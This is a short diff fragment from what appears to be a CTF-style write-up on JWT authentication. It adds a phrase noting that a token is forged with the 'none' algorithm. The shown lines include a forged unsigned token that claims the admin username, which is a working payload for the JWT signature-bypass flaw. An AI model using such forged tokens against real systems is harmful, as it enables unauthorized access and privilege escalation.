@@ -61,7 +61,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AW
 {"typ":"JWT","alg":"HS256"}.{"username":"guest"}.'a signature crafted using a secret unknown to us'
 ```
 
-We can craft our own JWT :
+We can craft our own JWT using the 'none' algorithm :
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
 {"typ":"JWT","alg":"none"}.{"username":"admin"}.
